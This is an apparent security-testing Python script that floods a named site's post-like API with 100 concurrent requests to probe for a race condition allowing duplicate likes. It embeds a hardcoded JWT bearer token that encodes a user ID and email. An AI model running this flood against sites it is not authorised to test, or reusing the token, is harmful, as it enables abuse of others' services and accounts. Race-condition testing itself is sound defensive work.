#!/usr/bin/env python3
"""
DAST Advanced #1: Race Condition — Like Bombardment
═════════════════════════════════════════════════════
Target : POST /api/posts/:id/like
Attack : Fire 100 concurrent "Like" requests with 1 JWT on 1 post
Goal   : See if TOCTOU race lets one user create multiple like rows

Expected if SECURE:   All duplicate inserts fail (PK constraint), <=1 like created
Expected if VULNERABLE: Multiple like rows for same (user_id, target_type, target_id)
"""

import requests
import time
import sys
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

# ─── Configuration ──────────────────────────────────────────────────────────
TARGET = "https://livelinepcbn.com"
VALID_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI5NmMxOGQ2Mi01ZmQ0LTRmMDYtOGYwMy05NjQ3ZTA0MTk0NzYiLCJlbWFpbCI6ImR1bmdkb25nMzMzQGdtYWlsLmNvbSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzc2MzA1OTA2LCJleHAiOjE3NzY5MTA3MDZ9.11Kqob-SnuxmryCEVF-Pa09GaO844C_9P6qTNzXyOlw"

# First, get the latest post ID
HEADERS = {"Authorization": f"Bearer {VALID_JWT}"}
TOTAL_REQUESTS = 100
THREADS = 50  # max concurrency — try to hit the window

# ─── Step 1: Get a post to target ──────────────────────────────────────────
print("Step 1: Fetching a target post...")
r = requests.get(f"{TARGET}/api/posts?page=1&limit=1", headers=HEADERS, timeout=10)
if r.status_code != 200:
    print(f"  Failed to fetch posts: HTTP {r.status_code} — {r.text[:200]}")
    sys.exit(1)

posts_data = r.json()
if not posts_data.get("data"):
    print("  No posts found. Create one first.")
    sys.exit(1)

target_post = posts_data["data"][0]
POST_ID = target_post["id"]
initial_likes = target_post.get("likes", [])
print(f"  Target post: {POST_ID}")
print(f"  Current like count: {len(initial_likes)}")

# ─── Step 2: Unlike first (clean slate) ────────────────────────────────────
print("\nStep 2: Ensuring post is unliked (clean slate)...")
r = requests.post(f"{TARGET}/api/posts/{POST_ID}/like", headers=HEADERS, timeout=10)
# Check if we need to unlike again (toggle)
r2 = requests.get(f"{TARGET}/api/posts?page=1&limit=1", headers=HEADERS, timeout=10)
post_data = r2.json()["data"][0]
my_user_id = "96c18d62-5fd4-4f06-8f03-9647e0419476"
if my_user_id in post_data.get("likes", []):
    # Still liked — toggle again to unlike
    requests.post(f"{TARGET}/api/posts/{POST_ID}/like", headers=HEADERS, timeout=10)
    print("  Unliked successfully.")
else:
    print("  Already unliked.")

# ─── Step 3: Fire the cannon ──────────────────────────────────────────────
ENDPOINT = f"{TARGET}/api/posts/{POST_ID}/like"
results = {"success": 0, "error": 0}
status_counts = {}


def fire_like(i):
    try:
        r = requests.post(ENDPOINT, headers=HEADERS, timeout=10)
        return i, r.status_code, r.text[:100]
    except Exception as e:
        return i, 0, str(e)[:100]


print(f"\nStep 3: Firing {TOTAL_REQUESTS} concurrent LIKE requests...")
print(f"  Post ID: {POST_ID}")
print(f"  Threads: {THREADS}")
print()

start = time.time()

with ThreadPoolExecutor(max_workers=THREADS) as pool:
    futures = [pool.submit(fire_like, i) for i in range(TOTAL_REQUESTS)]
    for future in as_completed(futures):
        i, code, body = future.result()
        status_counts[code] = status_counts.get(code, 0) + 1
        if code == 200:
            results["success"] += 1
        else:
            results["error"] += 1

elapsed = time.time() - start

# ─── Step 4: Verify — how many likes does the post actually have? ─────────
print(f"\nStep 4: Verifying final like count...")
r = requests.get(f"{TARGET}/api/posts?page=1&limit=1", headers=HEADERS, timeout=10)
final_post = r.json()["data"][0]
final_likes = final_post.get("likes", [])
my_like_count = final_likes.count(my_user_id)

print(f"""
============== RESULTS ==============
  Total requests : {TOTAL_REQUESTS}
  Elapsed time   : {elapsed:.2f}s
  HTTP successes : {results['success']}
  HTTP errors    : {results['error']}
  Status codes   : {dict(sorted(status_counts.items()))}

  Final total likes on post: {len(final_likes)}
  My userId appears {my_like_count} time(s) in likes array
""")

if my_like_count <= 1:
    print("  VERDICT: SECURE")
    print("  PRIMARY KEY (user_id, target_type, target_id) prevented duplicate likes.")
    print("  Race condition window exists in app code (check-then-insert)")
    print("  BUT the DB constraint is the final safety net.")
else:
    print(f"  VERDICT: VULNERABLE")
    print(f"  User appears {my_like_count} times! Race condition succeeded.")
    print("  Fix: Use UPSERT or ON CONFLICT instead of check-then-insert.")
